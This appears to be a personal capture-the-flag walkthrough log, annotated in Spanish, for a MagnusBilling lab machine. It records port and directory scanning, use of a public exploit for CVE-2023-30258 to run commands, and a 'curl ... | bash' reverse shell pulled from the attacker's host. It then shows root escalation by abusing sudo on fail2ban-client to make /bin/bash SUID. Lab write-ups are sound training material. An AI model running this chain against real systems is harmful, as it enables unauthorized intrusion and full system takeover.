sudo openvpn us-east-1-isaactellez183-regular.ovpn
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.66.134.126 -oG allportsBilling
sudo nmap -p22,80,3306,5038 -sCV 10.66.134.126 -oN targetBilling
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.66.134.126/mbilling/ -t 30

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.134.126/mbilling/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
archive              (Status: 301) [Size: 325] [--> http://10.66.134.126/mbilling/archive/]                                                                                     
resources            (Status: 301) [Size: 327] [--> http://10.66.134.126/mbilling/resources/]                                                                                   
assets               (Status: 301) [Size: 324] [--> http://10.66.134.126/mbilling/assets/]                                                                                      
lib                  (Status: 301) [Size: 321] [--> http://10.66.134.126/mbilling/lib/]
tmp                  (Status: 301) [Size: 321] [--> http://10.66.134.126/mbilling/tmp/]
LICENSE              (Status: 200) [Size: 7652]
protected            (Status: 403) [Size: 278]

http://10.66.134.126/mbilling/
http://10.66.134.126/mbilling/lib/mercadopago/

wget http://10.66.134.126/mbilling/lib/mercadopago/cacert.pem
cat cacert.pem
wget http://10.66.134.126/mbilling/lib/mercadopago/mercadopago.php
cat mercadopago.php
- empty

buscar en broadcom para exploits de mbilling, encontramos uno 

git clone https://github.com/Chocapikk/CVE-2023-30258.git
cd CVE-2023-30258 
ls
cat README.md 
nano exp.sh  //analisis
chmod +x exp.sh

sudo python3 -m http.server 80 
[sudo] password for luffytazo: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.66.134.126 - - [01/Nov/2026 11:57:09] code 404, message File not found
10.66.134.126 - - [01/Nov/2026 11:57:09] "GET /wwwww.php HTTP/1.1" 404 -


./exp.sh http://10.66.134.126/mbilling/ whoami
./exp.sh http://10.66.134.126/mbilling/ "wget http://192.168.132.17/wwwww.php"

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.66.134.126 - - [01/Nov/2026 11:57:09] code 404, message File not found
10.66.134.126 - - [01/Nov/2026 11:57:09] "GET /wwwww.php HTTP/1.1" 404 -


sudo python3 -m http.server 80

sudo nc -nlvp 443 
./exp.sh http://10.66.134.126/mbilling/ "curl http://192.168.132.17/ | bash"

connect to [192.168.132.17] from (UNKNOWN) [10.66.134.126] 42368
bash: cannot set terminal process group (1222): Inappropriate ioctl for device
bash: no job control in this shell
asterisk@ip-10-66-134-126:/var/www/html/mbilling/lib/icepay$

# ESCALADA DE PRIVILIEGIOS

sudo nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.132.17] from (UNKNOWN) [10.66.134.126] 46992
bash: cannot set terminal process group (1222): Inappropriate ioctl for device
bash: no job control in this shell
asterisk@ip-10-66-134-126:/var/www/html/mbilling/lib/icepay$ tty
tty
not a tty
asterisk@ip-10-66-134-126:/var/www/html/mbilling/lib/icepay$ export TERM=xterm
<var/www/html/mbilling/lib/icepay$ export TERM=xterm         
asterisk@ip-10-66-134-126:/var/www/html/mbilling/lib/icepay$ script /dev/null -c bash
 basht /dev/null -c 
Script started, output log file is '/dev/null'.
asterisk@ip-10-66-134-126:/var/www/html/mbilling/lib/icepay$ ^Z
zsh: suspended  sudo nc -nlvp 443

stty raw -echo;fg
[1]  + continued  sudo nc -nlvp 443
                                   reset xterm  
s 88risk@ip-10-66-134-126:/var/www/html/mbilling/lib/icepay$ stty rows 29 column 
asterisk@ip-10-66-134-126:/var/www/html/mbilling/lib/icepay$ cd /home/
asterisk@ip-10-66-134-126:/home$ ls
debian  magnus  ssm-user
asterisk@ip-10-66-134-126:/home$ ls -la
total 20
drwxr-xr-x  5 root     root     4096 Nov  1 07:28 .
drwxr-xr-x 19 root     root     4096 Nov  1 07:28 ..
drwxr-xr-x  3 debian   debian   4096 Nov  1 07:28 debian
drwxr-xr-x 15 magnus   magnus   4096 Sep  9  2024 magnus
drwxr-xr-x  2 ssm-user ssm-user 4096 May 28  2025 ssm-user
asterisk@ip-10-66-134-126:/home$ id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
asterisk@ip-10-66-134-126:/home$ whoami
asterisk
asterisk@ip-10-66-134-126:/home$ sudo -l
Matching Defaults entries for asterisk on ip-10-66-134-126:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-66-134-126:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
podemos ir buscando en los directorios pero no parece que encontremos nada aun

GTFOBINS buscar escalada metodo

asterisk@ip-10-66-134-126:/home$ sudo fail2ban-client set sshd addaction sshd_action
sshd_action
asterisk@ip-10-66-134-126:/home$ sudo fail2ban-client set sshd action sshd_action actionban "chmod +s /bin/bash"
chmod +s /bin/bash
asterisk@ip-10-66-134-126:/home$ sudo fail2ban-client set sshd banip 192.168.0.90
1
asterisk@ip-10-66-134-126:/home$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# ls
debian  magnus  ssm-user

find / -iname "user.txt" -o -iname "root.txt" 2>/dev/null
bash-5.2# cat /root/root.txt
bash-5.2# cat /home/magnus/user.txt


